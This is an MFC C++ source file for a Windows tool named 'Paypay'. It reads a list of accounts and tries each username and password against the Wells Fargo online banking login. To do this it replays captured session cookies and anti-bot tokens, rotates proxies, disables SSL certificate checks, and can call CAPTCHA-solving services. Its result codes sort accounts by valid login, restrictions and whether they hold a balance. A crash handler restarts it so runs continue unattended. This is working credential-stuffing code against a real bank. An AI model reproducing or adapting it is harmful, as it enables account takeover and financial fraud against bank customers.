
// PaypayDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "Paypay.h"
#include "PaypayDlg.h"
#include <wincrypt.h>
#include <sstream> 
#include "WinHttpClient/WinHttpClient.h" 
#include "MyGzip.h"
#include "RK_Interface.h"
#include <Dbghelp.h>
#include <dbghelp.h>
#include <crtdbg.h>

#pragma comment ( lib, "dbghelp.lib" )


#define WM_MY_OWN_MSG WM_USER + 100
#ifdef _DEBUG
#define new DEBUG_NEW
#endif
HANDLE hMutex;
IStream * g_pStream;
extern HANDLE cookieMutex;
// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// 对话框数据
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)

END_MESSAGE_MAP()


// CPaypayDlg 对话框

wstring g_strCode;
LRESULT CPaypayDlg::OnRecvUsermsg(WPARAM wParam, LPARAM lParam)
{

	
	try
	{
	wstring strHtml = *((wstring*)wParam);
	int tag = *((int*)lParam);
	CString str;
	str = "https://connect.secure.wellsfargo.com/auth/login/do";
	if (tag == 0)
	{
		WaitForSingleObject(cookieMutex,INFINITE);
		m_cookieProcess.setConnectionOptions(strHtml.c_str());
		m_iee.Navigate(str, NULL, NULL, NULL, NULL);
		ReleaseMutex(cookieMutex);
	}
	else if (tag == 1)

	{
		WaitForSingleObject(cookieMutex,INFINITE);
		m_cookieProcess_1.setConnectionOptions(strHtml.c_str());
		m_ie_1.Navigate(str, NULL, NULL, NULL, NULL);
		ReleaseMutex(cookieMutex);
	}

	}
	catch (...)
	{
		return 0;
	}
	//string strHtml = *((string*)wParam);
	////run_time_ie->DestroyWindow();
	////delete run_time_ie;
	////run_time_ie = new CExplorer1;
	////
	////RECT rect;
	////GetClientRect(&rect);
	////HRESULT hr = run_time_ie->Create(L"aa", WS_CHILD | WS_VISIBLE, rect, this, 20);
	////run_time_ie->Navigate(L"about:blank", NULL, NULL, NULL, NULL);
	////m_iee.Navigate(L"about:blank", NULL, NULL, NULL, NULL);
	////CComQIPtr<IHTMLDocument2> spDoc = run_time_ie->get_Document();
	////g_pStream->Release();
	////CoMarshalInterThreadInterfaceInStream(IID_IHTMLDocument2, spDoc, &g_pStream);
	////return 0;
	//try
	//{
	//	wstring kj = wstring(strHtml.begin(), strHtml.end());
	//	CComQIPtr<IHTMLDocument2> spDoc = m_iee.get_Document();
	//	if (spDoc)  //运行js脚本获取post数据
	//	{
	//		SAFEARRAY* psa = SafeArrayCreateVector(VT_VARIANT, 0, 1);
	//		VARIANT *param;
	//		bstr_t bsData = (LPCTSTR)(kj.c_str());
	//		//bstr_t bsData = (LPCTSTR)(StringToWString(kj)).c_str();
	//		HRESULT hr = SafeArrayAccessData(psa, (LPVOID*)&param);
	//		if (hr != S_OK || param == NULL)
	//		{
	//			return 0;
	//		}
	//		param->vt = VT_BSTR;
	//		param->bstrVal = (BSTR)bsData;
	//		SafeArrayUnaccessData(psa);
	//		hr = spDoc->write(psa);
	//		spDoc->close();
	//		SafeArrayDestroy(psa);
	//		SysFreeString(bsData);

	//		IHTMLElement*   pElement;
	//		hr = spDoc->get_body(&pElement);
	//		if (hr != S_OK || pElement == NULL)
	//		{
	//			return 0;
	//		}

	//		BSTR bs = SysAllocString(L"");
	//		hr = pElement->get_innerText(&bs);
	//		if (hr != S_OK)
	//		{
	//			pElement->Release();
	//			SysFreeString(bs);
	//			return 0;
	//		}
	//		if (bs == NULL)
	//		{
	//			pElement->Release();
	//			return 0;
	//		}
	//		pElement->Release();
	//		g_strCode = bs;
	//		SysFreeString(bs);
	//	}
	//	else
	//	{
	//		return 0;
	//	}
	//	return 1;
	//}
	//catch (...)
	//{
	//	return 0;
	//}

	return 0;
}


CPaypayDlg::CPaypayDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CPaypayDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	m_cookieProcess.setExplorer(&m_iee);
	m_cookieProcess.setPayDlg(this);
	m_cookieProcess.setTag(0);
	m_cookieProcess_1.setExplorer(&m_ie_1);
	m_cookieProcess_1.setPayDlg(this);
	m_cookieProcess_1.setTag(1);
}

void CPaypayDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT1, m_daili_address);
	DDX_Control(pDX, IDC_EDIT4, m_thread_input_num);
	DDX_Control(pDX, IDC_EDIT2, m_input_file_path);
	DDX_Control(pDX, IDC_LIST1, m_list_box);
	//DDX_Control(pDX, IDC_EXPLORER1, m_ie);
	DDX_Control(pDX, IDC_EDIT3, m_time);
	DDX_Control(pDX, IDC_PROGRESS1, m_progress);
	DDX_Control(pDX, IDC_EXPLORER1, m_iee);
	DDX_Control(pDX, IDC_EDIT6, m_chongqi);
	DDX_Control(pDX, IDC_EXPLORER2, m_ie_1);
}

BEGIN_MESSAGE_MAP(CPaypayDlg, CDialog)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	//}}AFX_MSG_MAP
	ON_MESSAGE(WM_MY_OWN_MSG, &CPaypayDlg::OnRecvUsermsg)
	ON_BN_CLICKED(IDC_BUTTON1, &CPaypayDlg::OnBnClickedButton1)
	ON_BN_CLICKED(IDC_BUTTON2, &CPaypayDlg::OnBnClickedButton2)
	ON_BN_CLICKED(IDC_CHECK1, &CPaypayDlg::OnBnClickedCheck1)
	ON_BN_CLICKED(IDC_BUTTON4, &CPaypayDlg::OnBnClickedButton4)
	ON_BN_CLICKED(IDC_CHECK2, &CPaypayDlg::OnBnClickedCheck2)
	ON_BN_CLICKED(IDC_BUTTON3, &CPaypayDlg::OnBnClickedButton3)
	ON_BN_CLICKED(IDC_CHECK3, &CPaypayDlg::OnBnClickedCheck3)
	ON_WM_TIMER()
	ON_STN_CLICKED(IDC_STATIC_7, &CPaypayDlg::OnStnClickedStatic7)
	ON_WM_CLOSE()
	ON_STN_CLICKED(IDC_STATIC19, &CPaypayDlg::OnStnClickedStatic19)
	ON_BN_CLICKED(IDC_CHECK4, &CPaypayDlg::OnBnClickedCheck4)
END_MESSAGE_MAP()




std::wstring StringToWString(const std::string &str)
{
std::wstring wstr(str.length(),L' ');
std::copy(str.begin(), str.end(), wstr.begin());
return wstr; 
}

std::string WStringToString(const std::wstring &wstr)
{
std::string str(wstr.length(), ' ');
std::copy(wstr.begin(), wstr.end(), str.begin());
return str; 
}

wstring UTF8ToUnicode( const string &str )
{
	int  len = 0;
	len = str.length();
	int  unicodeLen = ::MultiByteToWideChar( CP_UTF8,
		0,
		str.c_str(),
		-1,
		NULL,
		0 );
	wchar_t   *pUnicode;
	pUnicode = new  wchar_t[unicodeLen + 1];
	memset(pUnicode, 0, (unicodeLen + 1)*sizeof(wchar_t));
	::MultiByteToWideChar( CP_UTF8,
		0,
		str.c_str(),
		-1,
		(LPWSTR)pUnicode,
		unicodeLen );
	wstring  rt;
	rt = ( wchar_t * )pUnicode;
	delete  pUnicode;

	return  rt;
}
unsigned char ToHex(unsigned char x)   
{   
	return  x > 9 ? x + 55 : x + 48;   
} 
std::string UrlEncode(const std::string& str)  
{  
	std::string strTemp = "";  
	size_t length = str.length();  
	for (size_t i = 0; i < length; i++)  
	{  
		if (isalnum((unsigned char)str[i]) ||   
			(str[i] == '-') ||  
			(str[i] == '_') ||   
			(str[i] == '.') ||   
			(str[i] == '~'))  
			strTemp += str[i];  
		else if (str[i] == ' ')  
			strTemp += "+";  
		else  
		{  
			strTemp += '%';  
			strTemp += ToHex((unsigned char)str[i] >> 4);  
			strTemp += ToHex((unsigned char)str[i] % 16);  
		}  
	}  
	return strTemp;  
}  

//UTF-8 GBK
int UTF82GBK(char *szUtf8, char *szGbk, int Len)
{
	int n = MultiByteToWideChar(CP_UTF8, 0, szUtf8, -1, NULL, 0);
	WCHAR * wszGBK = new WCHAR[sizeof(WCHAR)* n];
	memset(wszGBK, 0, sizeof(WCHAR)* n);
	MultiByteToWideChar(CP_UTF8, 0, szUtf8, -1, wszGBK, n);
	n = WideCharToMultiByte(CP_ACP, 0, wszGBK, -1, NULL, 0, NULL, NULL);
	if (n > Len)
	{
		delete[]wszGBK;
		return -1;
	}
	WideCharToMultiByte(CP_ACP, 0, wszGBK, -1, szGbk, n, NULL, NULL);

	delete[]wszGBK;
	wszGBK = NULL;

	return 0;
}

void CPaypayDlg::addLogMsg(LPCTSTR msg)
{
	m_list_box.InsertString(0, msg);
}
	

enum CONNECT_RETURN
{
	LOGIN_ERROR_CONNECT=0,	//网络异常，可能是代理不能用，可能是网络连接失败
	LOGIN_ERROR_CODE,	    //验证码识别失败
	LOGIN_ERROR_PROXY,      //代理不可用
	LOGIN_ERROR_SUCCESS,   //登陆成功
	LOGIN_ERROR_SUCCESS_ACTIVATE,  //登陆成功 需要激活设备的账号
	LOGIN_ERROR_SUCCESS_LIMIT,  //登陆成功 受限的账号
	LOGIN_ERROR_FAIL,      //用户密码错误 登陆失败
	LOGIN_ERROR_UNKOWN,    //未知状态，统计下最终结果
	LOGIN_ERROR_PASS,      //出现验证码 又没http代理也没验证码识别 那就直接pass这个账号了
	LOGIN_ERROR_PASS2,     //账号状态位置
	LOGIN_ERROR_HASMONEY,  //有余额
	LOGIN_ERROR_NOMONEY,   //没有余额
	LOGIN_ERROR_COOKIE,     //cookie过期,重新获取cookie
	LOGIN_ERROR_CAN_NOT_LOGIN,
};

wstring g_rk_name;
wstring g_rk_passward;
bool g_used_chongqi = false;
bool g_useHTTP=false;   //使用http代理
bool g_useCODE=false;     //使用验证码自动识别
////返回值为LOGIN_ERROR_CONNECT或者LOGIN_ERROR_PROXY的时候需要更换代理
int CPaypayDlg::Login2(string username, string password, wstring proxy, wstring cookie,string & returnstr)
{
	WinHttpClient WinClient(L"https://connect.secure.wellsfargo.com/auth/login/do");
//	WinClient.SetProxy(L"202.100.167.182:80");
	if (g_useHTTP)
	{
		WinClient.SetProxy(proxy);
//		WinClient.SetProxy(L"127.0.0.1:8888");
		m_list_box.InsertString(0, proxy.c_str());	
	}

	WinClient.SetRequireValidSslCertificates(false); 
	
//	WaitForSingleObject(hMutex, INFINITE);
//	WinClient.SendHttpRequest(L"GET");
	wstring wshead = L"";
	wshead.append(L"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*\r\nAccept-Encoding: gzip, deflate\r\nReferer: https://connect.secure.wellsfargo.com/auth/login/present?origin=cob\r\nAccept-Language: zh-CN\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3)\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: connect.secure.wellsfargo.com\r\nConnection: Keep-Alive\r\nCookie: ");
	wshead.append(cookie);
	wshead.append(L"; CookiesAreEnabled=yes\r\n");
	WinClient.SetAdditionalRequestHeaders(wshead);
//	WinClient.SetAdditionalRequestHeaders(L"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*\r\nAccept-Encoding: gzip, deflate\r\nReferer: https://connect.secure.wellsfargo.com/auth/login/present?origin=cob\r\nAccept-Language: zh-CN\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3)\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: connect.secure.wellsfargo.com\r\nConnection: Keep-Alive\r\nCookie: gingerbread_cookie=659D8CDE8BE69A243170C74EE2120F83; AuthCookie=5504c74d-14c0-4800-9313-b15cc29d2080; LOGINORIGIN=cob; TSPD_101=08aa1e3d9cab2800f128dd5ed4a643b51daf38ef81d944a5b2559f29b2ae4e70098d3a2f0f97b7e62b1e8f1c0fe3d2f3; ISD_LA_COOKIE=Snp/+bc9F3jdr+JZqajeWX2h7Um4nXvcjE9SMaTq0/dUw5SDoGzIswMRtavDJDSnU+elpN6F5gAAAAE=; wfacookie=45201605122157511525634291; CookiesAreEnabled=yes\r\n");


	string strPost = "";
	strPost.append("origin=cob&userPrefs=Nda44j1dCnMurAAA2AR5siuJ02RLJlFr0iAi_.Fr4_uav2jprFvdF3ClOI41EfiWrH_LvaAxSoDuJ02RLJlFr0iAi_.Fr4_BJCmerFvdF3ClOI42TzMS2i_.Fr4_BJCkQXvdF3ClOI42TthoDsmq6RkWMsi_TChJQlOlbw6XzU0ljjt0vl0cGlQsrRCjt4I6KG_0hKnkblaWStzLq8sgEngMQEjZrVglEagdrDy.sCgIq_nWkcIwrltCvWSdjKQnC29eJIwrltCvWSdjIaQCBBeikbtjYmQr1vITaraa5KMNIsr8qqMiDSw65zTiE0Q3zCwTI0hi0EnU6ZkQQkIlUjbyAr92UaaESWUrs9bUT0iakVxFMVQdg1kzoMMxy1drrFfwMHD2QyGJlpJOFQKRw8wOcMTUphXTA2wv4qnvtCsABItf9SnjVD2Q3xdRsR93zCwTITsMPQpLwnFme_3zCwTITsMPQotanI29fg8yQswaxkiordhtdW_Kq3yCmSh_vYbU0ljrfYkLlEnU6ZkQQVIwrltB5qw3wMvtzXxmVrtdYrMxy1drroxLd8KMeHTz_H2Cb_H_jaQjX9A88jIstpBSKykAxVMVQdgB3ZLQ084akJ73_9hJ39FMurJhCL5THW0L._WumpV2E2Tcfx9MsFr93A6OPBSpSJrk0ugN.xL43.KWbZcIKV8NTdJpV2E2TJfxJfy3CmViJ7LDc5CUC56MnGmRBNlY6RjJNlY52CKj01BNuy.67J&jsenabled=true&LOB=&loginMode=&serviceType=&screenid=&origination=WIB&TPB=&msgId=&platform=&alternatesignon=&destination=AccountSummary&YfXUyFmfT=");
	strPost.append(username);
	strPost.append("&j_password=");
	strPost.append(password);
	strPost.append("&save-username=false&_gaq_PbMVz=65664%3A456&_gaq_PbMVy=160512%3A456&X21WXNGOr8UVw7y=GoBYaBiC499ZrwaLXGRjvi%2FLImZfC7A0%2BH%2BAbCYqmC4HaUTyRO0kddAmsObDjSRfxMiPtkaL2WL6M%2Bz9qPUsy%2Fv5mdewBq0Xe441SaWRlc3s5qq4sTjwN%2FZht1xcc9%2F3uyZBauuWt8Pva0RqadTYlc%2FCogEGu3f4k9Y%2B%2FNxKlAISjfGyMLdm0xc1FdjS0sJ3XnuaPp50ROYqyeiD%2FlgsR6VixQ4VSV%2Fn7lZUrHfR9e%2Bx6fJ143YugKCpxLLHftuCONauYDrEXs2vm0V6PWOZSzf8yNTr2Rxi%2F6gsxkTADYTV%2FAPBxs8Ael3n37JbHNo2Pm7EzUUf1xUWLrZIScbcP38CKG26whR%2FyBxsD%2B0CW8aeRzNeljE42KNra0QxlHOiod%2Fc%2FM%2FtrxBWa4BLRZSNj%2FGPeL1%2BYX33v1dFj6vgYgvuhnpv5YUUQMC1hGHaUXa%2BPCJxpIMUcSoq%2BFw501J%2FExtuFFDl6eysj4KeVVPM74DTUGGleVSTUL1vk7E5pl4gD85jberg4L9%2BTiGe8gw2Ot%2BxsZrHuPIA8b1JATNhVxgdq8GlvP26EYk5FSWMpqZwDp59GASSgwvWV25NdpIOjv%2BJ7%2FfCT8ENx8EfMs4IA5tjShqXP4FI50yqXNu3TF66X%2Bh0PncMgx6P7OhQ9hbHU73cLRRmVS5UCNg%2FIRp%2BYyiZg0EQyGnDgK2LfZk3MzWpUSNIVIQk1WIZnlpabQas4oND4We46AFYuH6ycT1e4%2FbwvDnt5QqQYLstSEvdikvVPdGaj3yfLkpwphVSHQYuWka3xbT%2BoZcAz%2BMUUSs1nnX5xDhoTGfZri83GljVkz1nH6nF2glQg7ME4UzHFidmzZyfAaI37nPmbXvXduEoTBxCsnnRfz07Fu%2BJJhqdbI3AmzBZZ9jPxE52iiA7fvyJS1025w9z6oOmC3buK3dnrEQNQb0fxn%2FiG9HqzHrc9rfuCGDJb4ttpyeeFw%3D%3D&cCsShXPGakyNoBZS1LupPA1z=%7B%22du%22%3A0%2C%22g%22%3A%22https%3A%2F%2Fconnect.secure.wellsfargo.com%2Fauth%2Flogin%2Fpresent%22%7D");

//	string strPost22 = "origin=cob&userPrefs=Nda44j1dCnMurAAA2AR5siuJ02RLJlFr0iAi_.Fr4_uav2jprFvdF3ClOI41EfiWrH_LvaAxSoDuJ02RLJlFr0iAi_.Fr4_BJCmerFvdF3ClOI42TzMS2i_.Fr4_BJCkQXvdF3ClOI42TthoDsmq6RkWMsi_TChJQlOlbw6XzU0ljjt0vl0cGlQsrRCjt4I6KG_0hKnkblaWStzLq8sgEngMQEjZrVglEagdrDy.sCgIq_nWkcIwrltCvWSdjKQnC29eJIwrltCvWSdjIaQCBBeikbtjYmQr1vITaraa5KMNIsr8qqMiDSw65zTiE0Q3zCwTI0hi0EnU6ZkQQkIlUjbyAr92UaaESWUrs9bUT0iakVxFMVQdg1kzoMMxy1drrFfwMHD2QyGJlpJOFQKRw8wOcMTUphXTA2wv4qnvtCsABItf9SnjVD2Q3xdRsR93zCwTITsMPQpLwnFme_3zCwTITsMPQotanI29fg8yQswaxkiordhtdW_Kq3yCmSh_vYbU0ljrfYkLlEnU6ZkQQVIwrltB5qw3wMvtzXxmVrtdYrMxy1drroxLd8KMeHTz_H2Cb_H_jaQjX9A88jIstpBSKykAxVMVQdgB3ZLQ084akJ73_9hJ39FMurJhCL5THW0L._WumpV2E2Tcfx9MsFr93A6OPBSpSJrk0ugN.xL43.KWbZcIKV8NTdJpV2E2TJfxJfy3CmViJ7LDc5CUC56MnGmRBNlY6RjJNlY52CKj01BNuy.67J&jsenabled=true&LOB=&loginMode=&serviceType=&screenid=&origination=WIB&TPB=&msgId=&platform=&alternatesignon=&destination=AccountSummary&YfXUyFmfT=112&j_password=333&save-username=false&_gaq_PbMVz=65664%3A456&_gaq_PbMVy=160512%3A456&X21WXNGOr8UVw7y=GoBYaBiC499ZrwaLXGRjvi%2FLImZfC7A0%2BH%2BAbCYqmC4HaUTyRO0kddAmsObDjSRfxMiPtkaL2WL6M%2Bz9qPUsy%2Fv5mdewBq0Xe441SaWRlc3s5qq4sTjwN%2FZht1xcc9%2F3uyZBauuWt8Pva0RqadTYlc%2FCogEGu3f4k9Y%2B%2FNxKlAISjfGyMLdm0xc1FdjS0sJ3XnuaPp50ROYqyeiD%2FlgsR6VixQ4VSV%2Fn7lZUrHfR9e%2Bx6fJ143YugKCpxLLHftuCONauYDrEXs2vm0V6PWOZSzf8yNTr2Rxi%2F6gsxkTADYTV%2FAPBxs8Ael3n37JbHNo2Pm7EzUUf1xUWLrZIScbcP38CKG26whR%2FyBxsD%2B0CW8aeRzNeljE42KNra0QxlHOiod%2Fc%2FM%2FtrxBWa4BLRZSNj%2FGPeL1%2BYX33v1dFj6vgYgvuhnpv5YUUQMC1hGHaUXa%2BPCJxpIMUcSoq%2BFw501J%2FExtuFFDl6eysj4KeVVPM74DTUGGleVSTUL1vk7E5pl4gD85jberg4L9%2BTiGe8gw2Ot%2BxsZrHuPIA8b1JATNhVxgdq8GlvP26EYk5FSWMpqZwDp59GASSgwvWV25NdpIOjv%2BJ7%2FfCT8ENx8EfMs4IA5tjShqXP4FI50yqXNu3TF66X%2Bh0PncMgx6P7OhQ9hbHU73cLRRmVS5UCNg%2FIRp%2BYyiZg0EQyGnDgK2LfZk3MzWpUSNIVIQk1WIZnlpabQas4oND4We46AFYuH6ycT1e4%2FbwvDnt5QqQYLstSEvdikvVPdGaj3yfLkpwphVSHQYuWka3xbT%2BoZcAz%2BMUUSs1nnX5xDhoTGfZri83GljVkz1nH6nF2glQg7ME4UzHFidmzZyfAaI37nPmbXvXduEoTBxCsnnRfz07Fu%2BJJhqdbI3AmzBZZ9jPxE52iiA7fvyJS1025w9z6oOmC3buK3dnrEQNQb0fxn%2FiG9HqzHrc9rfuCGDJb4ttpyeeFw%3D%3D&cCsShXPGakyNoBZS1LupPA1z=%7B%22du%22%3A0%2C%22g%22%3A%22https%3A%2F%2Fconnect.secure.wellsfargo.com%2Fauth%2Flogin%2Fpresent%22%7D";
	WinClient.SetAdditionalDataToSend((BYTE *)strPost.c_str(), strPost.length());
	WinClient.SendHttpRequest(L"POST");

	if ((int)WinClient.m_responseHeader.length()<=0)    //代理不可用
	{
		return LOGIN_ERROR_PROXY;
	}
	if (((int)WinClient.m_responseHeader.find(L"HTTP/1.1 500 Internal Server Error\r\n"))  >=0)
	{                                                                                        //cookie失效
//		m_list_box.InsertString(0, L"远程服务器返回错误  ---http://www.baidu.com");
		return LOGIN_ERROR_COOKIE;
	}
	else if (((int)WinClient.m_responseHeader.find(L"HTTP/1.1 200 OK\r\n")) < 0)
	{                                                                                        //换代理吧
		//m_list_box.InsertString(0, L"远程服务器返回错误  ---http://www.baidu.com");
		return LOGIN_ERROR_PROXY;
	}

		CMyGzip _gzip;
		stringstream os;
		string shttpResponseContent;
		PBYTE pBuff = NULL, pBuff_o = NULL;
		ULONG zdata = 0, ndata = 0;
	
		pBuff = (PBYTE)WinClient.m_pResponse;
		zdata = WinClient.m_responseByteCountReceived;
		ndata = zdata*10;
		pBuff_o = (PBYTE)malloc(zdata*10);
		if(pBuff_o)
		{
			memset(pBuff_o, NULL, ndata);
			_gzip.httpgzdecompress(pBuff, zdata+1, pBuff_o, &ndata);
			os.clear();
			os.str("");
			os << pBuff_o;
			shttpResponseContent.clear();
			shttpResponseContent = os.str();
			free(pBuff_o);
		}
		else
		{
			return LOGIN_ERROR_CONNECT;
		}

		if (shttpResponseContent.length() >= 1024)
		{
			string a=shttpResponseContent.substr(shttpResponseContent.length()-10,10);
			string str1 = "</html>";
			string::size_type idx = a.find(str1);
			if (idx == string::npos)
			{ 
				return LOGIN_ERROR_CONNECT;    //没有找到
			}
		}
		else
		{
			return LOGIN_ERROR_CONNECT;
		}

		if (((int)shttpResponseContent.find("We do not recognize your username and/or password")) > 0)  //密码错误
		{
			return LOGIN_ERROR_FAIL;    
		}
		else if (((int)shttpResponseContent.find("window[\"bobcmn\"]")) > 0)  //cookie没有，重新获取吧，这种情况应该不会出现
		{
			return LOGIN_ERROR_COOKIE;
		}
		else if (((int)shttpResponseContent.find("Sign On to View Your Accounts")) > 0)
		{
			return LOGIN_ERROR_COOKIE;
		}
		else if (((int)shttpResponseContent.find("Online access is currently unavailable")) > 0)
		{
			return LOGIN_ERROR_CAN_NOT_LOGIN;
		}
#ifdef XM_DEBUG
		TCHAR szFilePath[MAX_PATH + 1]={0};
		GetModuleFileName(NULL, szFilePath, MAX_PATH);
		(_tcsrchr(szFilePath, _T('\\')))[1] = 0;
		CString str_url = szFilePath; 
		wstring wname = wstring(username.begin(),username.end());
		wstring jmk = wstring(szFilePath) + wname + L".txt";
		ofstream outfile(jmk,ios_base::app); 
		string dd = shttpResponseContent;
		outfile<<dd;
		outfile.close();
#endif
		return LOGIN_ERROR_SUCCESS;
}
// 创建Dump文件
// 
void CreateDumpFile(LPCWSTR lpstrDumpFilePathName, EXCEPTION_POINTERS *pException)
{
	// 创建Dump文件
	//
	HANDLE hDumpFile = CreateFile(lpstrDumpFilePathName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	// Dump信息
	//
	MINIDUMP_EXCEPTION_INFORMATION dumpInfo;
	dumpInfo.ExceptionPointers = pException;
	dumpInfo.ThreadId = GetCurrentThreadId();
	dumpInfo.ClientPointers = TRUE;

	// 写入Dump文件内容
	//
	MiniDumpWriteDump(GetCurrentProcess(), GetCurrentProcessId(), hDumpFile, MiniDumpNormal, &dumpInfo, NULL, NULL);

	CloseHandle(hDumpFile);
}
// 处理Unhandled Exception的回调函数
//
LONG ApplicationCrashHandler(EXCEPTION_POINTERS *pException)
{

	PROCESS_INFORMATION   info;
	STARTUPINFO startup;
	wchar_t szPath[128];
	wchar_t *szCmdLine;
	GetModuleFileName(AfxGetApp()->m_hInstance, szPath, sizeof(szPath));
	szCmdLine = GetCommandLine();
	GetStartupInfo(&startup);
	BOOL   bSucc = CreateProcess(szPath, L"chongqi", NULL, NULL,
		FALSE, NORMAL_PRIORITY_CLASS, NULL, NULL, &startup, &info);
	ExitProcess(-1);


	// 这里弹出一个错误对话框并退出程序
	//
	CreateDumpFile(_T("paypay.dmp"), pException);
//	FatalAppExit(-1, _T("*** Unhandled Exception! ***"));

	return EXCEPTION_EXECUTE_HANDLER;
}

// 一个有函数调用的类
// 
class CrashTest
{
public:
	void Test()
	{
		Crash();
	}

private:
	void Crash()
	{
		// 除零，人为的使程序崩溃
		//
		int i = 13;
		int j = 0;
		int _ = i / j;
	}
};

// CPaypayDlg 消息处理程序
wstring g_ini_file_path;
int g_shanchu_daili_time = 0;
BOOL CPaypayDlg::OnInitDialog()
{
	CDialog::OnInitDialog();
	_CrtSetDbgFlag(_CrtSetDbgFlag(_CRTDBG_REPORT_FLAG) | _CRTDBG_LEAK_CHECK_DF);
	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}


	_CrtSetDbgFlag ( _CRTDBG_ALLOC_MEM_DF | _CRTDBG_LEAK_CHECK_DF );
	// 设置此对话框的图标。当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标
	TCHAR szFilePath[MAX_PATH + 1]={0};
	GetModuleFileName(NULL, szFilePath, MAX_PATH);
	(_tcsrchr(szFilePath, _T('\\')))[1] = 0;
	g_ini_file_path = wstring(szFilePath) +  wstring(L"config.ini");
	// TODO: 在此添加额外的初始化代码
	//Login();
	
	g_shanchu_daili_time = 60 * 60 + 34;
//	SetTimer(5, 1000, NULL);
	readAllConfig();
	m_iee.Navigate(L"about:blank", NULL, NULL, NULL, NULL);
//	CComQIPtr<IHTMLDocument2> spDoc = m_iee.get_Document();
//	SetTimer(2,3000,NULL);
	CoInternetSetFeatureEnabled(FEATURE_DISABLE_NAVIGATION_SOUNDS, SET_FEATURE_ON_PROCESS, TRUE);
	//IUnknownPtr pUnk;
	//pUnk = m_iee.GetControlUnknown();
	//CComQIPtr<IWebBrowser2> pWeb;
	//pUnk->QueryInterface(IID_IWebBrowser2, (void**)&pWeb);
//	CoMarshalInterThreadInterfaceInStream(IID_IHTMLDocument2, spDoc, &g_pStream);
	//CoMarshalInterThreadInterfaceInStream(IID_IWebBrowser2, pWeb, &g_pStream);
	SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)ApplicationCrashHandler);
//	CrashTest test;
//	test.Test();
	wchar_t *szCmdLine;
	szCmdLine   =   GetCommandLine();
	wstring cm = wstring(szCmdLine);
	if(cm == L"chongqi")
	{
		OnBnClickedButton2();
	}
	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CPaypayDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CPaypayDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CPaypayDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}




void CPaypayDlg::OnBnClickedButton1()
{
	// TODO: 在此添加控件通知处理程序代码
	CFileDialog dialog(TRUE,_T("txt"),NULL,OFN_HIDEREADONLY|OFN_OVERWRITEPROMPT,_T("txt|*.txt|| "));
	if(dialog.DoModal()==IDOK)
	{
		CString filePathName =  dialog.GetPathName();//取得文件路径及文件名
		SetDlgItemText(IDC_EDIT2,filePathName);
		WritePrivateProfileString(L"pay",L"zhanghao",filePathName.GetString(),g_ini_file_path.c_str());
	}
